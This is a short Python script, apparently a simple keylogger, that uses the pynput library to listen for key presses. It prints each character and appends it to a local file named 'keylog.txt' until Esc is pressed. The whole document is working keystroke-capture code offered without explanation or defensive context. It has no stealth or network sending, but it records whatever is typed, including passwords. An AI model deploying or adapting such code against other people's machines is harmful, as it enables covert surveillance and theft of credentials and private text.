from pynput.keyboard import Key, Listener

def on_press(key, injected=None):
    try:
        print(key.char)
        with open("keylog.txt", "a") as f:
            f.write(key.char)
    except AttributeError:
        with open("keylog.txt", "a") as f:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")

    if key == Key.esc:
        return False

with Listener(on_press=on_press) as listener:
    listener.join()